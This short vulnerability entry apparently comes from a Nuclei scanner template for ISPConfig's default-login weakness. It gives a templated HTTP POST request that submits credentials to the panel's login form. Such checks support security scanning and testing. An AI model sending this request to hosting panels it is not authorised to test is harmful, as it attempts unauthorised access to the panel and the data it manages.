# Vulnerability: ISPConfig Hosting Control Panel - Default Login
**Classification:** ISPCONFIG
**Source:** Nuclei Template (`ispconfig-hcp-default-login.yaml`)

## Description
ISPConfig Hosting Control Panel Default Password Vulnerability exposes systems to unauthorized access, compromising data integrity and security.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /content.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&passwort={{password}}&s_mod=login&s_pg=index
```

